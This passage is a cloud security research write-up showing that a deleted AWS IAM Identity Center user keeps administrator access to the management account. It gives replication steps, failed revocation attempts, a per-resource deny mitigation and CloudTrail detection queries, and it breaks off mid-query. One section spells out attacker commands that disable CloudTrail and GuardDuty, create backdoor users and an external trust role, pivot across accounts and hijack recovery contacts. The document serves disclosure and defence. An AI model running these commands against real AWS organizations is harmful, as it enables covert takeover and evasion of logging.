# The Zombie User: AWS IAM Identity Center Session Persistence on the Management Account

### TL;DR

You deleted the AWS user. Their access is still active.

On the AWS management account, every standard fix disable the user, end their sessions, attach a deny policy, delete the account either does nothing or returns an error. We tested all seven. Zero worked.

The session stays alive for up to 12 hours. That is enough time for an attacker to create a permanent backdoor, delete your audit logs, and remove every guardrail protecting your other AWS accounts. When the session finally expires, the attacker is already gone and so is any trace they were there.

This affects any AWS organization that ran the standard Identity Center setup wizard. AWS's own documentation says not to put human access on the management account. AWS's own wizard does it anyway. The customer did nothing wrong.

***

### Research Summary

A deleted AWS IAM Identity Center user retains valid AdministratorAccess to the AWS management account for up to **12 hours** (the maximum configurable session duration) with no account-level kill switch available to the owner.

Every standard incident response action fails silently. The **only confirmed real-time mitigation** is placing an explicit deny on each AWS resource individually via resource-based policies (S3 bucket policies, KMS key policies, Secrets Manager resource policies). This must be done per resource. There is no account-wide equivalent. Services without resource-based policies IAM, EC2, Organizations, CloudTrail remain fully exposed for the entire zombie window with no mitigation available.

***

### Scope and Default Exposure

**This vulnerability affects the AWS management account only.**

On member accounts all standard mitigations work SCPs apply immediately, the `AWSReservedSSO_*` role is customer-owned and modifiable, and inline deny policies and permissions boundaries all function correctly.

**The management account is the specific failure point because of two AWS architectural decisions that interact:**

1. The management account is permanently exempt from SCPs (AWS-hardcoded, not configurable)
2. `AWSReservedSSO_*` roles on the management account are AWS-owned and immutable

Neither design decision is a bug in isolation. Together, on the same account, they eliminate every real-time kill switch during an active incident.

#### Who Is Exposed by Default

> **The likely counterargument:** "The management account shouldn't have human SSO access that's a misconfiguration."
>
> **The answer:** AWS's own setup wizard provisions IAM Identity Center on the management account. Their documentation says don't do this. Their tooling does it anyway. The customer who followed the wizard did not misconfigure anything they trusted the product defaults. That gap between AWS's guidance and AWS's defaults is where this vulnerability lives.

When an organization enables AWS Organizations and runs the IAM Identity Center setup wizard, SSO is configured on the management account by default. This means the majority of AWS organizations using IAM Identity Center are in the vulnerable configuration without any deliberate action on their part. They ran the wizard. They are exposed.

Member-account-only organizations (those who manually moved SSO off the management account) are not affected by the zero-kill-switch finding, though the base STS persistence behavior still applies.

**Note on delegated administration:** AWS Organizations allows delegating IdC administration to a member account. Organizations that have done this have a different attack surface the `AWSReservedSSO_*` roles exist on the delegated admin account rather than the management account, and that account is not permanently exempt from SCPs. The zero-kill-switch finding as documented here applies specifically to the default configuration where IdC runs on the management account.

***

### Environment Used for Testing

| Setting                      | Value                                                 |
| ---------------------------- | ----------------------------------------------------- |
| IAM Identity Center instance | `ssoins-72232524f5d640bc`                             |
| Identity Store ID            | `d-90661b44df`                                        |
| Management Account ID        | `227027960003` (alias: wehost)                        |
| Test user                    | `cnathanielb007`                                      |
| Permission set role          | `AWSReservedSSO_AdministratorAccess_63ae28612ff7719a` |
| Session duration configured  | 1 hour (max is 12 hours)                              |
| AWS CLI profile              | `groot-ops`                                           |

***

### Complete Replication Walkthrough (From Scratch)

This section walks through the full replication from zero from creating the test user to proving the zombie session survives deletion. Set the variables block once and every command below uses them automatically.

**What you need before starting:**

* An AWS Organization with IAM Identity Center enabled on the management account
* An admin AWS CLI profile with access to the management account (`groot-ops` here)
* Two terminal windows: Terminal 1 (admin), Terminal 2 (test user)

***

#### Set Variables Run This First (Terminal 1)

```bash
# ── Static values set once ──────────────────────────────────────────────────
ADMIN_PROFILE="groot-ops"
TEST_PROFILE="zombie-test"
IDENTITY_STORE_ID="d-90661b44df"
INSTANCE_ARN="arn:aws:sso:::instance/ssoins-72232524f5d640bc"
MGMT_ACCOUNT_ID="227027960003"
ORG_ROOT_ID="r-l49q"
TEST_USERNAME="cnathanielb007"
TEST_EMAIL="cnathanielb007@gmail.com"
SSO_ROLE_NAME="AWSReservedSSO_AdministratorAccess_63ae28612ff7719a"
SSO_START_URL="https://d-90661b44df.awsapps.com/start"
SSO_REGION="us-east-1"

# ── Captured values filled in as you go ─────────────────────────────────────
# USER_ID         set in Phase 1
# PERMISSION_SET_ARN  set in Phase 2
# SCP_POLICY_ID   set in Phase 5
```

> These variables live in your current shell session. If you open a new terminal, re-run this block before continuing.

***

#### Phase 1 Create the Test User in Identity Center

**Terminal 1 (admin)**

```bash
# Confirm your admin profile works
aws sts get-caller-identity --profile $ADMIN_PROFILE

# Create the test user
USER_ID=$(aws identitystore create-user \
  --identity-store-id $IDENTITY_STORE_ID \
  --user-name $TEST_USERNAME \
  --display-name "Test Zombie User" \
  --name GivenName=Test,FamilyName=Zombie \
  --emails "[{\"Value\":\"$TEST_EMAIL\",\"Type\":\"work\",\"Primary\":true}]" \
  --profile $ADMIN_PROFILE \
  --query 'UserId' --output text)

echo "USER_ID=$USER_ID"
# Save this paste it back if you open a new terminal

# Verify the user was created
aws identitystore describe-user \
  --identity-store-id $IDENTITY_STORE_ID \
  --user-id $USER_ID \
  --profile $ADMIN_PROFILE
```

**Send the verification/welcome email and set a password console only (no CLI equivalent):**

The `identitystore` and `sso-admin` APIs do not expose password management or email verification for the built-in identity store. This step must be done via the console:

1. Go to: **IAM Identity Center → Users → `cnathanielb007`**
2. Click **"Send email verification link"** this sends an email to `$TEST_EMAIL` confirming the address is reachable
3. Click **"Reset password"** → select **"Generate a one-time password"**
4. Copy the one-time password shown you will use it on first login to set a permanent password

> **Note:** Setting a password via CLI is not possible for the IAM Identity Center built-in identity store. AWS does not expose a `set-password` or `reset-password` API in either `identitystore` or `sso-admin`. If your IdC is connected to an external IdP (Okta, Azure AD, Google), manage passwords there instead.

> If your IdC is connected to an external identity provider (Okta, Azure AD), create the user in the IdP instead and let it sync in. The CLI create-user path only works for the built-in identity store.

***

#### Phase 2 Find or Create the AdministratorAccess Permission Set

```bash
# List existing permission sets
aws sso-admin list-permission-sets \
  --instance-arn $INSTANCE_ARN \
  --profile $ADMIN_PROFILE

# Describe each ARN to find the AdministratorAccess one substitute the ARN below
PERMISSION_SET_ARN=$(aws sso-admin list-permission-sets \
  --instance-arn $INSTANCE_ARN \
  --profile $ADMIN_PROFILE \
  --query 'PermissionSets[0]' --output text)
# If you have multiple, loop through and match by name:
# aws sso-admin describe-permission-set --instance-arn $INSTANCE_ARN \
#   --permission-set-arn $PERMISSION_SET_ARN --profile $ADMIN_PROFILE

# If AdministratorAccess doesn't exist, create it
PERMISSION_SET_ARN=$(aws sso-admin create-permission-set \
  --instance-arn $INSTANCE_ARN \
  --name AdministratorAccess \
  --session-duration PT1H \
  --profile $ADMIN_PROFILE \
  --query 'PermissionSet.PermissionSetArn' --output text)

echo "PERMISSION_SET_ARN=$PERMISSION_SET_ARN"

# Attach the AWS managed AdministratorAccess policy to it
aws sso-admin attach-managed-policy-to-permission-set \
  --instance-arn $INSTANCE_ARN \
  --permission-set-arn $PERMISSION_SET_ARN \
  --managed-policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile $ADMIN_PROFILE
```

***

#### Phase 3 Assign the Permission Set to the Test User on the Management Account

```bash
aws sso-admin create-account-assignment \
  --instance-arn $INSTANCE_ARN \
  --target-id $MGMT_ACCOUNT_ID \
  --target-type AWS_ACCOUNT \
  --permission-set-arn $PERMISSION_SET_ARN \
  --principal-type USER \
  --principal-id $USER_ID \
  --profile $ADMIN_PROFILE
# Wait for Status: SUCCEEDED before continuing

# Confirm the assignment exists
aws sso-admin list-account-assignments \
  --instance-arn $INSTANCE_ARN \
  --account-id $MGMT_ACCOUNT_ID \
  --permission-set-arn $PERMISSION_SET_ARN \
  --profile $ADMIN_PROFILE
```

***

#### Phase 4 Set a Password and Establish the Test User Session

If using the built-in identity store, set a temporary password via the IdC console:

* IAM Identity Center → Users → $TEST\_USERNAME → Reset password → Send email or generate one-time link

**Terminal 2 (test user) set the same variables first, then:**

```bash
# Add the sso-session config to ~/.aws/config for refresh token support
cat >> ~/.aws/config << EOF

[sso-session my-sso]
sso_start_url = $SSO_START_URL
sso_registration_scopes = sso:account:access
sso_region = $SSO_REGION

[profile $TEST_PROFILE]
sso_session = my-sso
sso_account_id = $MGMT_ACCOUNT_ID
sso_role_name = AdministratorAccess
EOF

# Log in opens browser to complete SSO auth as $TEST_USERNAME
aws sso login --profile $TEST_PROFILE

# Verify session is active SAVE THIS OUTPUT with timestamp (this is T=0)
date && aws sts get-caller-identity --profile $TEST_PROFILE

# Confirm AdministratorAccess is functional
aws iam list-roles --profile $TEST_PROFILE | head -20
aws s3 ls --profile $TEST_PROFILE

# Check if a refresh token was cached (requires sso-session config above)
cat ~/.aws/sso/cache/*.json | python3 -m json.tool | grep -E "refreshToken|expiresAt|clientId"
```

***

#### Phase 5 Run the Kill Sequence (Terminal 1, admin)

Execute each step and note the result. **Do not pause between steps run them in sequence.**

```bash
# Kill 1: Disable the user
# Do this via console: IAM Identity Center → Users → $TEST_USERNAME → Disable
# Confirm it's disabled
aws identitystore describe-user \
  --identity-store-id $IDENTITY_STORE_ID \
  --user-id $USER_ID \
  --profile $ADMIN_PROFILE

# Kill 2: End active sessions via console
# IAM Identity Center → Users → $TEST_USERNAME → Active Sessions → End session

# Kill 3: Delete the user entirely
aws identitystore delete-user \
  --identity-store-id $IDENTITY_STORE_ID \
  --user-id $USER_ID \
  --profile $ADMIN_PROFILE
# No output = success

# Confirm deletion
aws identitystore describe-user \
  --identity-store-id $IDENTITY_STORE_ID \
  --user-id $USER_ID \
  --profile $ADMIN_PROFILE
# Expected: ResourceNotFoundException user is gone

# Kill 4: SCP deny on org root
SCP_POLICY_ID=$(aws organizations create-policy \
  --name "DenyRevokedUser-$TEST_USERNAME" \
  --type SERVICE_CONTROL_POLICY \
  --description "Kill persistent STS session for deleted IdC user" \
  --content "{
    \"Version\":\"2012-10-17\",
    \"Statement\":[{
      \"Sid\":\"DenyRevokedUser\",
      \"Effect\":\"Deny\",
      \"Action\":\"*\",
      \"Resource\":\"*\",
      \"Condition\":{
        \"StringLike\":{
          \"aws:userId\":\"*:$TEST_USERNAME\"
        }
      }
    }]
  }" \
  --profile $ADMIN_PROFILE \
  --query 'Policy.PolicySummary.Id' --output text)

echo "SCP_POLICY_ID=$SCP_POLICY_ID"

aws organizations attach-policy \
  --policy-id $SCP_POLICY_ID \
  --target-id $ORG_ROOT_ID \
  --profile $ADMIN_PROFILE

# Kill 5: Role inline deny policy
aws iam put-role-policy \
  --role-name $SSO_ROLE_NAME \
  --policy-name AWSRevokeOlderSessions \
  --profile $ADMIN_PROFILE \
  --policy-document "{
    \"Version\":\"2012-10-17\",
    \"Statement\":[{
      \"Effect\":\"Deny\",
      \"Action\":[\"*\"],
      \"Resource\":[\"*\"],
      \"Condition\":{
        \"DateLessThan\":{
          \"aws:TokenIssueTime\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"
        }
      }
    }]
  }"
# Expected: UnmodifiableEntity error

# Kill 6: Permissions boundary
aws iam put-role-permissions-boundary \
  --role-name $SSO_ROLE_NAME \
  --permissions-boundary arn:aws:iam::aws:policy/AWSDenyAll \
  --profile $ADMIN_PROFILE
# Expected: UnmodifiableEntity error

# Kill 7: Delete account assignment (already gone, but confirm)
aws sso-admin delete-account-assignment \
  --instance-arn $INSTANCE_ARN \
  --target-id $MGMT_ACCOUNT_ID \
  --target-type AWS_ACCOUNT \
  --permission-set-arn $PERMISSION_SET_ARN \
  --principal-type USER \
  --principal-id $USER_ID \
  --profile $ADMIN_PROFILE
# Expected: FAILED EntitlementItem doesn't exist
```

***

#### Phase 6 Prove the Zombie Session is Still Alive (Terminal 2, test user)

```bash
# Record exact timestamp compare against T=0 from Phase 4
date && aws sts get-caller-identity --profile $TEST_PROFILE
# Still returns valid identity for a user that does not exist

# Confirm access is not degraded
aws s3 ls --profile $TEST_PROFILE
aws iam list-roles --profile $TEST_PROFILE
aws ec2 describe-instances --region $SSO_REGION --profile $TEST_PROFILE

# Cross-check: user is gone but session is alive
aws identitystore list-users --identity-store-id $IDENTITY_STORE_ID \
  --filters AttributePath=UserName,AttributeValue=$TEST_USERNAME \
  --profile $ADMIN_PROFILE
# Returns: "Users": []  ← user does not exist
```

**What you expect to see:** Every API call succeeds. `list-users` returns empty. That side-by-side is your empirical proof.

***

#### Phase 7 Refresh Token Test Result

**The refresh token exchange fails after user deletion.**

When a user is **deleted** from Identity Center, the OIDC service validates user existence at token exchange time. `aws sso-oidc create-token` with a `refresh_token` grant fails after deletion the window is strictly bounded by the STS session duration. Disabling a user (without deleting) does not break the refresh token exchange.

The test was run as follows:

```bash
# Step 1: Extract cached tokens (using sso-session config)
CACHE_FILE=$(ls ~/.aws/sso/cache/*.json | head -1)
CLIENT_ID=$(python3 -c "import sys,json; print(json.load(open('$CACHE_FILE'))['clientId'])")
CLIENT_SECRET=$(python3 -c "import sys,json; print(json.load(open('$CACHE_FILE'))['clientSecret'])")
REFRESH_TOKEN=$(python3 -c "import sys,json; print(json.load(open('$CACHE_FILE'))['refreshToken'])")

# Step 2: Attempt to exchange refresh token after user deletion
aws sso-oidc create-token \
  --client-id $CLIENT_ID \
  --client-secret $CLIENT_SECRET \
  --grant-type refresh_token \
  --refresh-token $REFRESH_TOKEN \
  --region $SSO_REGION
# RESULT: Error token exchange rejected after user deletion
```

**Implication:** Deletion is a stronger action than disabling. Disabling preserves the refresh token loop; deletion breaks it. The zombie window on a deleted user is therefore capped at the configured session duration (1–12 hours depending on permission set config).

***

#### Phase 8 Resource-Based Policy Mitigation Test

This phase confirms that an explicit deny on a resource-based policy (S3 bucket policy) is the **only real-time partial mitigation** that works against the zombie session on the management account. Run this while the zombie session from Phase 6 is still alive.

**Terminal 1 (admin)**

```bash
# Create a test bucket
aws s3 mb s3://zombie-test-bucket-$MGMT_ACCOUNT_ID --region $SSO_REGION --profile $ADMIN_PROFILE

# Confirm zombie can access it before the deny
aws s3 ls s3://zombie-test-bucket-$MGMT_ACCOUNT_ID --profile $TEST_PROFILE
# Expected: empty bucket listing access works

# Get the zombie's exact userId
ZOMBIE_USER_ID=$(aws sts get-caller-identity --profile $TEST_PROFILE --query 'UserId' --output text)
echo "ZOMBIE_USER_ID=$ZOMBIE_USER_ID"
# Format: AROAXXXXXXXXX:cnathanielb007

# Write the deny policy to a file
python3 -c "
import json, os
policy = {
  'Version': '2012-10-17',
  'Statement': [{
    'Sid': 'DenyZombieUser',
    'Effect': 'Deny',
    'Principal': '*',
    'Action': 's3:*',
    'Resource': [
      'arn:aws:s3:::zombie-test-bucket-' + os.environ['MGMT_ACCOUNT_ID'],
      'arn:aws:s3:::zombie-test-bucket-' + os.environ['MGMT_ACCOUNT_ID'] + '/*'
    ],
    'Condition': {'StringLike': {'aws:userId': os.environ['ZOMBIE_USER_ID']}}
  }]
}
print(json.dumps(policy, indent=2))
" > /tmp/bucket-policy.json

cat /tmp/bucket-policy.json  # verify before applying

# Apply the deny policy
aws s3api put-bucket-policy \
  --bucket zombie-test-bucket-$MGMT_ACCOUNT_ID \
  --policy file:///tmp/bucket-policy.json \
  --profile $ADMIN_PROFILE
```

**Test the deny (Terminal 2 zombie session)**

```bash
# Attempt S3 access after deny policy applied
aws s3 ls s3://zombie-test-bucket-$MGMT_ACCOUNT_ID --profile $TEST_PROFILE
# Expected: An error occurred (AccessDenied) DENY WORKS

# Confirm admin profile is unaffected
aws s3 ls s3://zombie-test-bucket-$MGMT_ACCOUNT_ID --profile $ADMIN_PROFILE
# Expected: empty listing admin unaffected
```

**Result: explicit deny on S3 bucket policy blocks the zombie session immediately.**

This is the only confirmed real-time mitigation available on the management account. The limitation: it must be applied per resource. Services without resource-based policies (IAM, EC2, Organizations, CloudTrail) remain fully exposed for the duration of the zombie window.

| Service         | Resource Policy Available | Zombie Blockable?  |
| --------------- | ------------------------- | ------------------ |
| S3              | Yes bucket policy         | Yes confirmed      |
| KMS             | Yes key policy            | Yes same mechanism |
| Secrets Manager | Yes resource policy       | Yes same mechanism |
| IAM             | No                        | No fully exposed   |
| EC2             | No                        | No fully exposed   |
| Organizations   | No                        | No fully exposed   |
| CloudTrail      | No                        | No fully exposed   |

**Cleanup test bucket:**

```bash
aws s3 rb s3://zombie-test-bucket-$MGMT_ACCOUNT_ID --force --profile $ADMIN_PROFILE
```

***

#### Phase 9 Cleanup

```bash
# Remove the SCP
aws organizations detach-policy \
  --policy-id $SCP_POLICY_ID \
  --target-id $ORG_ROOT_ID \
  --profile $ADMIN_PROFILE

aws organizations delete-policy \
  --policy-id $SCP_POLICY_ID \
  --profile $ADMIN_PROFILE

# The test user is already deleted nothing else to remove in IdC
# If you created a new permission set, delete it
aws sso-admin delete-permission-set \
  --instance-arn $INSTANCE_ARN \
  --permission-set-arn $PERMISSION_SET_ARN \
  --profile $ADMIN_PROFILE
```

### The 3-Layer Session Architecture

| Layer | What It Is           | Kill Action                         | Result                            |
| ----- | -------------------- | ----------------------------------- | --------------------------------- |
| 1     | IdC portal session   | Disable user in console             | Blocks new logins only            |
| 2     | IdC active session   | End session via Active Sessions tab | Kills browser portal session      |
| 3     | STS role credentials | Nothing                             | **Persists until natural expiry** |

Root cause: The IdC portal is a federation broker. Once it issues STS credentials via `AssumeRoleWithWebIdentity`, those credentials are fully independent. AWS has no real-time revocation mechanism for outstanding STS tokens.

***

### The Zombie User Finding

#### What was proven empirically

1. Created an IdC user `cnathanielb007` and assigned AdministratorAccess to the management account
2. Established an active AWS console/CLI session
3. Disabled the user → session persisted
4. Ended active sessions via IdC console → session persisted
5. Deleted the user entirely from Identity Center → `ResourceNotFoundException` confirmed deletion
6. Session still valid `aws sts get-caller-identity` returned valid identity
7. Attempted all known kill switches → all failed (detailed below)

> A user that **does not exist** in AWS Identity Center has AdministratorAccess to the management account with no way to kill it.

***

### Attempted Kill Switches All Failed

#### Attempt 1 SCP Deny (fails: management account is exempt)

```bash
# Create the SCP
aws organizations create-policy \
  --name "DenyRevokedUser-cnathanielb007" \
  --type SERVICE_CONTROL_POLICY \
  --description "Kill persistent STS session for deleted IdC user" \
  --content '{
    "Version":"2012-10-17",
    "Statement":[{
      "Sid":"DenyRevokedUser",
      "Effect":"Deny",
      "Action":"*",
      "Resource":"*",
      "Condition":{
        "StringLike":{
          "aws:userId":"*:cnathanielb007"
        }
      }
    }]
  }' \
  --profile groot-ops

# Attach to org root
aws organizations attach-policy \
  --policy-id <policy-id-from-above> \
  --target-id r-l49q \
  --profile groot-ops

# Verify management account is exempt from SCPs
aws organizations describe-organization \
  --query 'Organization.MasterAccountId' \
  --profile groot-ops
# Returns 227027960003 confirms SCP has zero effect on this account
```

**Result:** SCP attached successfully but AWS explicitly exempts the management account. Session remains active.

***

#### Attempt 2 Role Inline Deny Policy (fails: role is AWS-protected)

```bash
aws iam put-role-policy \
  --role-name AWSReservedSSO_AdministratorAccess_63ae28612ff7719a \
  --policy-name AWSRevokeOlderSessions \
  --profile groot-ops \
  --policy-document '{
    "Version":"2012-10-17",
    "Statement":[{
      "Effect":"Deny",
      "Action":["*"],
      "Resource":["*"],
      "Condition":{
        "DateLessThan":{
          "aws:TokenIssueTime":"'"$(date -u +%Y-%m-%dT%H:%M:%SZ)"'"
        }
      }
    }]
  }'
```

**Result:**

```
An error occurred (UnmodifiableEntity): Cannot perform the operation on the protected
role 'AWSReservedSSO_AdministratorAccess_63ae28612ff7719a' - this role is only
modifiable by AWS
```

***

#### Attempt 3 Permissions Boundary (fails: same protection)

```bash
aws iam put-role-permissions-boundary \
  --role-name AWSReservedSSO_AdministratorAccess_63ae28612ff7719a \
  --permissions-boundary arn:aws:iam::aws:policy/AWSDenyAll \
  --profile groot-ops
```

**Result:**

```
An error occurred (UnmodifiableEntity): Cannot perform the operation on the protected
role 'AWSReservedSSO_AdministratorAccess_63ae28612ff7719a' - this role is only
modifiable by AWS
```

***

#### Attempt 4 Delete Account Assignment (fails: already removed)

```bash
aws sso-admin delete-account-assignment \
  --instance-arn arn:aws:sso:::instance/ssoins-72232524f5d640bc \
  --target-id 227027960003 \
  --target-type AWS_ACCOUNT \
  --permission-set-arn arn:aws:sso:::permissionSet/ssoins-72232524f5d640bc/ps-72236b21c2cce8a5 \
  --principal-type USER \
  --principal-id 74284478-20f1-7048-1d6f-ac7b8bc3c797 \
  --profile groot-ops
```

**Result:** `FAILED` `EntitlementItem doesn't exist` assignment was already gone, session still alive regardless.

***

### Kill Switch Summary

| Method                             | Expected             | Actual Result                                          |
| ---------------------------------- | -------------------- | ------------------------------------------------------ |
| Disable user in IdC                | Block access         | Session persists                                       |
| End active sessions in IdC console | Kill session         | Portal killed, STS alive                               |
| Delete user from Identity Center   | Permanent removal    | `ResourceNotFoundException` returned, session persists |
| SCP deny on org root               | Immediate block      | Silently ignored management account exempt             |
| Role inline deny policy            | Kill all sessions    | `UnmodifiableEntity` AWS-protected role                |
| Permissions boundary               | Restrict all actions | `UnmodifiableEntity` AWS-protected role                |
| Delete account assignment          | Remove access        | Already gone, irrelevant to active STS token           |

**Zero of seven kill switches worked.**

***

### Why the Management Account Makes This Worse

For a member account, three of the above methods work:

* SCP deny → immediate effect
* Role inline deny → works (role is not AWS-protected)
* Permissions boundary → works

The management account removes all three options simultaneously:

```
Management Account
├── SCP exempt by design (AWS hardcoded)
├── AWSReservedSSO_* role is AWS-owned and immutable
└── Permissions boundary blocked by same role protection
```

This is not a misconfiguration. It is the intended architecture.

***

### Real World Impact

A zombie user with AdministratorAccess on the management account can in the active window:

* Remove SCPs protecting all child accounts
* Access every member account via `OrganizationAccountAccessRole`
* Disable GuardDuty, CloudTrail, Security Hub org-wide
* Create new IAM users or roles with no guardrails
* Exfiltrate data from any account in the organization
* Modify billing contacts and account recovery options

***

#### The 10-Minute Full Compromise Sequence

A sophisticated attacker runs the following sequence during the zombie window. All steps execute from the zombie session (`$TEST_PROFILE`). Total time: under 10 minutes.

**Step 1 Extend the window to maximum**

```bash
aws sso-admin update-permission-set \
  --instance-arn arn:aws:sso:::instance/ssoins-72232524f5d640bc \
  --permission-set-arn arn:aws:sso:::permissionSet/ssoins-72232524f5d640bc/ps-72236b21c2cce8a5 \
  --session-duration PT12H \
  --profile $TEST_PROFILE
```

**Step 2 Go dark: stop CloudTrail logging**

```bash
# List all trails
aws cloudtrail list-trails --profile $TEST_PROFILE

# Stop logging on each trail
aws cloudtrail stop-logging --name <trail-arn> --profile $TEST_PROFILE
# Defender is now blind no API call logs from this point
```

**Step 3 Disable GuardDuty and Security Hub org-wide**

```bash
aws guardduty list-detectors --profile $TEST_PROFILE
aws guardduty delete-detector --detector-id <detector-id> --profile $TEST_PROFILE

aws securityhub disable-security-hub --profile $TEST_PROFILE
```

**Step 4 Create permanent IAM backdoor user**

```bash
aws iam create-user --user-name svc-monitor --profile $TEST_PROFILE

aws iam attach-user-policy \
  --user-name svc-monitor \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile $TEST_PROFILE

aws iam create-access-key --user-name svc-monitor --profile $TEST_PROFILE
# Save the AccessKeyId and SecretAccessKey permanent, no expiry
```

**Step 5 Create cross-account trust role pointing to external attacker account**

```bash
aws iam create-role \
  --role-name support-access \
  --assume-role-policy-document '{
    "Version":"2012-10-17",
    "Statement":[{
      "Effect":"Allow",
      "Principal":{"AWS":"arn:aws:iam::<attacker-external-account>:root"},
      "Action":"sts:AssumeRole"
    }]
  }' \
  --profile $TEST_PROFILE

aws iam attach-role-policy \
  --role-name support-access \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile $TEST_PROFILE
# Attacker's external account can now assume into the management account indefinitely
```

**Step 6 Pivot into every member account**

```bash
# List all accounts in the org
aws organizations list-accounts --profile $TEST_PROFILE

# Assume OrganizationAccountAccessRole in each member account
aws sts assume-role \
  --role-arn arn:aws:iam::<member-account-id>:role/OrganizationAccountAccessRole \
  --role-session-name pivot \
  --profile $TEST_PROFILE
# Full AdministratorAccess on every member account
# Repeat for each account create backdoor IAM users in each
```

**Step 7 Destroy all SCPs**

```bash
aws organizations list-policies --filter SERVICE_CONTROL_POLICY --profile $TEST_PROFILE

aws organizations detach-policy \
  --policy-id <scp-id> \
  --target-id r-l49q \
  --profile $TEST_PROFILE

aws organizations delete-policy --policy-id <scp-id> --profile $TEST_PROFILE
# Every guardrail protecting child accounts is gone
```

**Step 8 Take over account recovery**

```bash
aws account put-alternate-contact \
  --alternate-contact-type SECURITY \
  --email-address attacker@domain.com \
  --name "Attacker" \
  --phone-number "+1234567890" \
  --title "Security" \
  --profile $TEST_PROFILE
# Account recovery emails now go to the attacker
```

**Step 9 Re-enable CloudTrail (look clean)**

```bash
aws cloudtrail start-logging --name <trail-arn> --profile $TEST_PROFILE
# Logs resume steps 2-8 have no CloudTrail record
```

After step 9 the attacker lets the zombie session expire naturally. The IR team closed the incident at step 0. The attacker now has:

* Permanent IAM credentials with no expiry (`svc-monitor`)
* A cross-account trust role accessible from an external account
* AdministratorAccess backdoors in every member account
* No SCPs protecting any account in the org
* Account recovery contacts under attacker control
* A clean CloudTrail log showing nothing after the original deletion

**The 10-minute window turned a temporary session into permanent org-wide ownership.**

***

### Zombie Window by Access Method

The confirmed exposure window from empirical testing:

| Access Method         | Zombie Window                                    | Notes                                             |
| --------------------- | ------------------------------------------------ | ------------------------------------------------- |
| Web console only      | Up to configured session duration (max 12 hours) | Browser re-auth fails after expiry                |
| CLI (`aws sso login`) | Up to configured session duration (max 12 hours) | Refresh token exchange fails once user is deleted |

***

#### Refresh Token Persistence Disabled vs Deleted

Testing confirmed that deletion and disabling behave differently at the OIDC layer:

* **Disabling** a user refresh token exchange continues to work, session can be refreshed
* **Deleting** a user refresh token exchange fails, OIDC validates user existence at call time

This means deletion is the stronger action for breaking token refresh. The zombie window is strictly bounded by the STS session duration between 1 and 12 hours depending on the permission set configuration.

**The core finding is unaffected.** During that window there are zero account-level kill switches available on the management account. The only partial mitigation is per-resource explicit deny policies.

***

#### What Was Confirmed Empirically

| Claim                                                  | Result                                                                        |
| ------------------------------------------------------ | ----------------------------------------------------------------------------- |
| Deleted user retains active STS session                | **Confirmed** `ResourceNotFoundException` + valid `get-caller-identity`       |
| All 7 kill switches fail on management account         | **Confirmed**                                                                 |
| CloudTrail logs deleted user by name on every API call | **Confirmed**                                                                 |
| Refresh token exchange works after deletion            | **Disproved** OIDC validates user existence; deletion breaks the refresh loop |
| Resource-based explicit deny blocks zombie session     | **Confirmed** S3 bucket policy deny tested and works immediately              |

***

### Detection CloudTrail Evidence

#### Empirical CloudTrail Log Deleted User Making API Calls

The following is a real CloudTrail event captured during testing. At the time of this event, `aws identitystore list-users` returned `"Users": []` the user did not exist in Identity Center. The API call succeeded regardless.

```json
{
  "eventVersion": "1.11",
  "userIdentity": {
    "type": "AssumedRole",
    "principalId": "AROATJW7LYDB4ZQRP5JCN:cnathanielb007",
    "arn": "arn:aws:sts::227027960003:assumed-role/AWSReservedSSO_AdministratorAccess_63ae28612ff7719a/cnathanielb007",
    "accountId": "227027960003",
    "accessKeyId": "ASIATJW7LYDB5KBRJ6V7",
    "sessionContext": {
      "sessionIssuer": {
        "type": "Role",
        "principalId": "AROATJW7LYDB4ZQRP5JCN",
        "arn": "arn:aws:iam::227027960003:role/aws-reserved/sso.amazonaws.com/AWSReservedSSO_AdministratorAccess_63ae28612ff7719a",
        "accountId": "227027960003",
        "userName": "AWSReservedSSO_AdministratorAccess_63ae28612ff7719a"
      },
      "attributes": {
        "creationDate": "2026-03-11T10:43:57Z",
        "mfaAuthenticated": "false"
      }
    }
  },
  "eventTime": "2026-03-11T10:59:41Z",
  "eventSource": "s3.amazonaws.com",
  "eventName": "ListBuckets",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "202.134.x.x",
  "userAgent": "aws-cli/2.34.6",
  "requestParameters": {
    "Host": "s3.us-east-1.amazonaws.com"
  },
  "responseElements": null,
  "recipientAccountId": "227027960003"
}
```

**Key forensic fields:**

| Field                                    | Value                                | What It Proves                          |
| ---------------------------------------- | ------------------------------------ | --------------------------------------- |
| `userIdentity.arn`                       | `...assumed-role/.../cnathanielb007` | Deleted user named in every log entry   |
| `sessionContext.attributes.creationDate` | `2026-03-11T10:43:57Z`               | Token issued at login before deletion   |
| `eventTime`                              | `2026-03-11T10:59:41Z`               | API call made 15m after deletion        |
| `accessKeyId`                            | `ASIATJW7LYDB5KBRJ6V7`               | Same key across all zombie calls        |
| `responseElements`                       | `null` (success)                     | Request was not denied fully authorized |

The gap between `creationDate` (`10:43:57Z`) and `eventTime` (`10:59:41Z`) with the user deleted at approximately `10:45:00Z` is the empirical proof window. CloudTrail provides the forensic anchor; Identity Center says the user doesn't exist.

#### Detection Queries

Run this in CloudTrail Lake or Athena:

```sql
-- Detect API calls from a user that no longer exists in Identity Center
SELECT
  userIdentity.sessionContext.sessionIssuer.userName AS role_name,
  userIdentity.arn,
  userIdentity.sessionContext.webIdFederationData.federatedUserId AS sso_user,
  eventTime,
  eventName,
  sourceIPAddress,
  userIdentity.sessionContext.attributes.creationDate AS token_issued_at
FROM cloudtrail_logs
WHERE
  userIdentity.type = 'AssumedRole'
  AND userIdentity.sessionContext.sessionIssuer.userName
      LIKE 'AWSReservedSSO_AdministratorAccess_%'
  AND userIdentity.arn LIKE '%:cnathanielb007'
ORDER BY eventTime DESC;
```

Also query for the original `AssumeRoleWithWebIdentity` event to capture token issuance time:

```sql
SELECT
  eventTime,
  userIdentity.arn,
  requestParameters,
  sourceIPAddress
FROM cloudtrail_logs
WHERE
  eventName = 'AssumeRoleWithWebIdentity'
  AND userIdentity.sessionContext.sessionIssuer.userName
      LIKE 'AWSReservedSSO_%'
ORDER BY eventTime DESC
LIMIT 50;
```

Note: the refresh loop below applies to **disabled** users only not deleted users. `CreateToken` fails after deletion. Still worth monitoring for disabled-but-not-deleted users during IR triage:

```sql
SELECT
  eventTime,
  eventName,
  sourceIPAddress,
  userAgent,
  requestParameters
FROM cloudtrail_logs
WHERE
